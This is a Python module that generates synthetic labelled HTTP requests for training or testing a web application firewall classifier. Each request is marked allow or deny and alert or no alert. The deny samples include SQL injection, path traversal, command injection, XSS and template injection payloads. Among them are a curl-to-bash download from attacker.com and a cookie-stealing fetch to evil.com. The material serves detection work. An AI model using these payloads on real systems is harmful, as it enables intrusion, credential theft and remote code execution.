"""Synthetic data generation with simplified inputs and two-target WAF schema."""

import json
from typing import Any, Dict, List


STANDARD_QUESTIONS = {
    "action": {
        "type": "choice",
        "instructions": "Determine the gateway enforcement action for this incoming HTTP request.",
        "criteria": {
            "allow": "Pass the request through to the upstream application service",
            "deny": "Block and reject the request immediately with an HTTP 403 Forbidden response",
        },
    },
    "alert": {
        "type": "noul",
        "instructions": "Should a security alert or SOC notification be raised for this request?",
        "criteria": {
            "true": "Security anomaly, malicious payload, unauthorized probe, or policy violation requiring alert",
            "false": "Normal benign traffic requiring no security alert",
        },
    },
}


def generate_synthetic_waf_samples() -> List[Dict[str, Any]]:
    """
    Generates a balanced synthetic dataset with simplified inputs:
    - method, uri, protocol, user_agent
    And simplified outputs:
    - action ("allow" | "deny")
    - alert ("true" | "false")

    Enforces the domain invariant: Any denied request strictly requires alerting.
    """
    samples: List[Dict[str, Any]] = []

    # =========================================================================
    # 1. NORMAL BENIGN WEB TRAFFIC (action: allow, alert: false)
    # =========================================================================

    benign_uas = [
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64)",
        "Mozilla/5.0",
        "-",
        "",
    ]

    # Standard browser root and page requests
    for uri in ["/", "/about", "/contact", "/dashboard", "/login", "/profile", "/docs"]:
        for ua in benign_uas:
            for proto in ["HTTP/1.1", "HTTP/2.0"]:
                samples.append({
                    "state": {
                        "method": "GET",
                        "uri": uri,
                        "protocol": proto,
                        "user_agent": ua if ua != "-" else None,
                    },
                    "questions": STANDARD_QUESTIONS,
                    "targets": {
                        "action": "allow",
                        "alert": "false",
                    },
                })

    # HTTP/1.0 legacy benign requests
    samples.append({
        "state": {
            "method": "GET",
            "uri": "/",
            "protocol": "HTTP/1.0",
            "user_agent": None,
        },
        "questions": STANDARD_QUESTIONS,
        "targets": {
            "action": "allow",
            "alert": "false",
        },
    })

    # Static assets (favicons, manifests, icons, css, js, csv, sse)
    for asset_uri in [
        "/favicon.ico",
        "/manifest.json",
        "/robots.txt",
        "/static/css/bundle.css",
        "/static/js/main.js",
        "/assets/images/logo.png",
        "/api/brands/integration/homeassistant/icon.png",
        "/api/brands/integration/homeassistant/icon.png?placeholder=no&token=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
        "/api/hassio/addons/a0d7b954_ssh/icon",
        "/api/hassio/addons/9a00e5dd_dante-to-wireguard/icon",
        "/events.csv",
        "/distributor_events.csv",
        "/sse",
    ]:
        for ua in ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36", "Mozilla/5.0", None]:
            samples.append({
                "state": {
                    "method": "GET",
                    "uri": asset_uri,
                    "protocol": "HTTP/1.1" if asset_uri.startswith("/static") else "HTTP/2.0",
                    "user_agent": ua,
                },
                "questions": STANDARD_QUESTIONS,
                "targets": {
                    "action": "allow",
                    "alert": "false",
                },
            })

    # CORS Preflight OPTIONS requests on legitimate assets
    for opt_uri in ["/events.csv", "/distributor_events.csv", "/api/v1/auth/login"]:
        samples.append({
            "state": {
                "method": "OPTIONS",
                "uri": opt_uri,
                "protocol": "HTTP/2.0",
                "user_agent": "Mozilla/5.0 (X11; Linux x86_64)",
            },
            "questions": STANDARD_QUESTIONS,
            "targets": {
                "action": "allow",
                "alert": "false",
            },
        })

    # Legitimate Home Assistant Webhook requests (with timestamp and signature query parameters)
    for sig in [
        "1111222233334444555566667777888899990000aaaabbbbccccddddeeeeffff",
        "222233334444555566667777888899990000aaaabbbbccccddddeeeeffff1111",
        "33334444555566667777888899990000aaaabbbbccccddddeeeeffff2222",
        "4444555566667777888899990000aaaabbbbccccddddeeeeffff3333",
    ]:
        for query_extra in [
            "&ipv4=198.51.100.61",
            "&ipv4=198.51.100.61&ipv6=2001:db8:85a3::8a2e:370:7334",
            "",
        ]:
            samples.append({
                "state": {
                    "method": "GET",
                    "uri": f"/webhook.php?timestamp=1793188800&signature={sig}{query_extra}",
                    "protocol": "HTTP/1.1",
                    "user_agent": "Home-Assistant-Webhook",
                },
                "questions": STANDARD_QUESTIONS,
                "targets": {
                    "action": "allow",
                    "alert": "false",
                },
            })

    # Legitimate POST Webhook and API requests
    for hook_hash in [
        "a1b2c3d4e5f6789012345678abcdef0123456789abcdef0123456789abcdef",
        "b2c3d4e5f6a1789012345678abcdef0123456789abcdef0123456789abcdef",
    ]:
        samples.append({
            "state": {
                "method": "POST",
                "uri": f"/api/webhook/{hook_hash}",
                "protocol": "HTTP/2.0",
                "user_agent": "Home-Assistant-Webhook",
            },
            "questions": STANDARD_QUESTIONS,
            "targets": {
                "action": "allow",
                "alert": "false",
            },
        })
        samples.append({
            "state": {
                "method": "POST",
                "uri": f"/api/webhook/{hook_hash}",
                "protocol": "HTTP/2.0",
                "user_agent": None,
            },
            "questions": STANDARD_QUESTIONS,
            "targets": {
                "action": "allow",
                "alert": "false",
            },
        })

    # Legitimate API requests (POST/GET)
    samples.append({
        "state": {
            "method": "GET",
            "uri": "/api/hassio/addons/e1b5c59f_caddy-custom/logs/follow?lines=100",
            "protocol": "HTTP/2.0",
            "user_agent": "Mozilla/5.0 (X11; Linux x86_64)",
        },
        "questions": STANDARD_QUESTIONS,
        "targets": {
            "action": "allow",
            "alert": "false",
        },
    })
    samples.append({
        "state": {
            "method": "POST",
            "uri": "/api/v1/auth/login",
            "protocol": "HTTP/1.1",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        },
        "questions": STANDARD_QUESTIONS,
        "targets": {
            "action": "allow",
            "alert": "false",
        },
    })
    samples.append({
        "state": {
            "method": "GET",
            "uri": "/api/v2/items?page=1&limit=25&category=hardware",
            "protocol": "HTTP/1.1",
            "user_agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
        },
        "questions": STANDARD_QUESTIONS,
        "targets": {
            "action": "allow",
            "alert": "false",
        },
    })

    # Legitimate external data team crawlers
    samples.append({
        "state": {
            "method": "GET",
            "uri": "/",
            "protocol": "HTTP/1.1",
            "user_agent": "DreamHost Data Team (+http://www.dreamhost.com)",
        },
        "questions": STANDARD_QUESTIONS,
        "targets": {
            "action": "allow",
            "alert": "false",
        },
    })
    samples.append({
        "state": {
            "method": "GET",
            "uri": "/sse",
            "protocol": "HTTP/1.1",
            "user_agent": "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)",
        },
        "questions": STANDARD_QUESTIONS,
        "targets": {
            "action": "allow",
            "alert": "false",
        },
    })

    # =========================================================================
    # 2. SUSPICIOUS / ANOMALY TRAFFIC (action: allow, alert: true)
    # =========================================================================

    # Command-line tools accessing standard routes (observe and log, but don't drop)
    for cli_ua in ["curl/8.1.2", "python-requests/2.31.0", "Go-http-client/1.1", "Wget/1.21.3"]:
        samples.append({
            "state": {
                "method": "GET",
                "uri": "/api/v1/health",
                "protocol": "HTTP/1.1",
                "user_agent": cli_ua,
            },
            "questions": STANDARD_QUESTIONS,
            "targets": {
                "action": "allow",
                "alert": "true",
            },
        })

    # Developer hard-negatives (SQL tutorials, documentation search queries)
    samples.append({
        "state": {
            "method": "GET",
            "uri": "/search?q=SELECT+username+FROM+users+WHERE+active=1",
            "protocol": "HTTP/1.1",
            "user_agent": "Mozilla/5.0 (X11; Linux x86_64)",
        },
        "questions": STANDARD_QUESTIONS,
        "targets": {
            "action": "allow",
            "alert": "true",
        },
    })
    samples.append({
        "state": {
            "method": "GET",
            "uri": "/documentation/sql/how-to-use-where-or-syntax",
            "protocol": "HTTP/1.1",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        },
        "questions": STANDARD_QUESTIONS,
        "targets": {
            "action": "allow",
            "alert": "true",
        },
    })
    samples.append({
        "state": {
            "method": "POST",
            "uri": "/api/v2/articles/draft?title=Understanding%20SQL%20Injections%20and%20Escaping",
            "protocol": "HTTP/1.1",
            "user_agent": "Mozilla/5.0 (X11; Linux x86_64)",
        },
        "questions": STANDARD_QUESTIONS,
        "targets": {
            "action": "allow",
            "alert": "true",
        },
    })
    samples.append({
        "state": {
            "method": "GET",
            "uri": "/users?search=O'Connor&filter=active",
            "protocol": "HTTP/1.1",
            "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        },
        "questions": STANDARD_QUESTIONS,
        "targets": {
            "action": "allow",
            "alert": "true",
        },
    })

    # Unrecognized probe paths without malicious payload (log/alert but allow 404 upstream handling)
    for probe_404_uri in ["/xbtmsf8nm", "/random_probe_123"]:
        samples.append({
            "state": {
                "method": "GET",
                "uri": probe_404_uri,
                "protocol": "HTTP/1.1",
                "user_agent": "Mozilla/5.0 (compatible; CensysInspect/1.1)",
            },
            "questions": STANDARD_QUESTIONS,
            "targets": {
                "action": "allow",
                "alert": "true",
            },
        })

    # =========================================================================
    # 3. MALICIOUS EXPLOITS & PROBES (action: deny, alert: true)
    # =========================================================================

    # SQL Injection payloads (both raw and URL-encoded forms)
    sqli_payloads = [
        "/api/users?id=1' OR 1=1--",
        "/api/users?id=1%27%20OR%201=1--",
        "/products?category=1;DROP TABLE users;--",
        "/products?category=1;DROP%20TABLE%20users;--",
        "/login?user=admin' UNION SELECT username,password_hash FROM users--",
        "/login?user=admin%27%20UNION%20SELECT%20username,password_hash%20FROM%20users--",
        "/search?q=' UNION ALL SELECT NULL,table_name FROM information_schema.tables--",
        "/search?q=%27%20UNION%20ALL%20SELECT%20NULL,NULL,table_name%20FROM%20information_schema.tables--",
        "/api/items?sort=(SELECT CASE WHEN (1=1) THEN 1 ELSE pg_sleep(5) END)",
        "/api/items?sort=(SELECT%20CASE%20WHEN%20(1=1)%20THEN%201%20ELSE%20pg_sleep(5)%20END)",
    ]
    for sqli_uri in sqli_payloads:
        for ua in ["Mozilla/5.0 (X11; Linux x86_64)", "python-requests/2.31.0", "Mozilla/5.0", None]:
            samples.append({
                "state": {
                    "method": "POST" if "category" in sqli_uri else "GET",
                    "uri": sqli_uri,
                    "protocol": "HTTP/1.1",
                    "user_agent": ua,
                },
                "questions": STANDARD_QUESTIONS,
                "targets": {
                    "action": "deny",
                    "alert": "true",
                },
            })

    # Path Traversal & LFI (both slash styles and encoded forms)
    lfi_payloads = [
        "/../../../../etc/passwd",
        "/..%2f..%2f..%2f..%2fetc%2fpasswd",
        "/static/../../../../etc/shadow",
        "/static/..%2f..%2f..%2fetc%2fshadow",
        "/download?file=../../windows/win.ini",
        "/download?file=..\\..\\windows\\win.ini",
        "/view?file=/proc/self/environ",
        "/app/logs/../../../../var/log/auth.log",
    ]
    for lfi_uri in lfi_payloads:
        for ua in ["curl/7.88.1", "Mozilla/5.0", None]:
            samples.append({
                "state": {
                    "method": "GET",
                    "uri": lfi_uri,
                    "protocol": "HTTP/1.1",
                    "user_agent": ua,
                },
                "questions": STANDARD_QUESTIONS,
                "targets": {
                    "action": "deny",
                    "alert": "true",
                },
            })

    # OS Command Injection (both raw and encoded forms)
    cmd_payloads = [
        "/ping?host=127.0.0.1;cat /etc/passwd",
        "/ping?host=127.0.0.1;cat%20/etc/passwd",
        "/api/run?cmd=||whoami",
        "/api/run?cmd=%7C%7Cwhoami",
        "/tools/traceroute?target=8.8.8.8|id",
        "/tools/traceroute?target=8.8.8.8%7Cid",
        "/backup?archive=test&&curl http://attacker.com/rev.sh|bash",
        "/backup?archive=test%26%26curl%20http://attacker.com/rev.sh|bash",
    ]
    for cmd_uri in cmd_payloads:
        for ua in ["python-requests/2.31.0", "curl/8.1.2", "Mozilla/5.0", None]:
            samples.append({
                "state": {
                    "method": "POST" if "run" in cmd_uri else "GET",
                    "uri": cmd_uri,
                    "protocol": "HTTP/1.1",
                    "user_agent": ua,
                },
                "questions": STANDARD_QUESTIONS,
                "targets": {
                    "action": "deny",
                    "alert": "true",
                },
            })

    # Cross-Site Scripting (XSS) & Template Injection (SSTI) (both raw and encoded)
    xss_payloads = [
        "/search?q=<script>alert(document.cookie)</script>",
        "/search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
        "/profile?name={{7*7}}",
        "/profile?name=%7B%7B7*7%7D%7D",
        "/comments?content=<img src=x onerror=fetch('//evil.com/'+document.cookie)>",
        "/comments?content=%3Cimg%20src=x%20onerror=fetch(%27//evil.com/%27+document.cookie)%3E",
        "/view?template=${T(java.lang.Runtime).getRuntime().exec('id')}",
    ]
    for xss_uri in xss_payloads:
        for ua in ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "curl/7.88.1", "Mozilla/5.0", None]:
            samples.append({
                "state": {
                    "method": "GET",
                    "uri": xss_uri,
                    "protocol": "HTTP/1.1",
                    "user_agent": ua,
                },
                "questions": STANDARD_QUESTIONS,
                "targets": {
                    "action": "deny",
                    "alert": "true",
                },
            })

    # Automated Vulnerability Scanners & Sensitive File Probes
    for scanner_uri in [
        "/wp-login.php",
        "/xmlrpc.php?rsd",
        "/blog/wp-includes/wlwmanifest.xml",
        "/web/wp-includes/wlwmanifest.xml",
        "/wordpress/wp-includes/wlwmanifest.xml",
        "/website/wp-includes/wlwmanifest.xml",
        "/phpinfo.php",
        "/info.php",
        "/mcp",
        "/mcp/",
        "/trace/",
        "/trace/trace/",
        "/.env",
        "/.git/config",
        "/.aws/credentials",
        "/.well-known/pki-validation/update",
        "/actuator/env",
    ]:
        for ua in [
            "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
            "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",
            "-",
            "",
            None,
        ]:
            samples.append({
                "state": {
                    "method": "GET",
                    "uri": scanner_uri,
                    "protocol": "HTTP/1.1",
                    "user_agent": ua,
                },
                "questions": STANDARD_QUESTIONS,
                "targets": {
                    "action": "deny",
                    "alert": "true",
                },
            })

    # Explicit scanner user-agents (sqlmap, Nikto, masscan, leakix)
    for scanner_ua in [
        "sqlmap/1.8.3#stable (https://sqlmap.org)",
        "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)",
        "masscan/1.3.2 (https://github.com/robertdavidgraham/masscan)",
    ]:
        samples.append({
            "state": {
                "method": "GET",
                "uri": "/",
                "protocol": "HTTP/1.1",
                "user_agent": scanner_ua,
            },
            "questions": STANDARD_QUESTIONS,
            "targets": {
                "action": "deny",
                "alert": "true",
            },
        })

    return samples
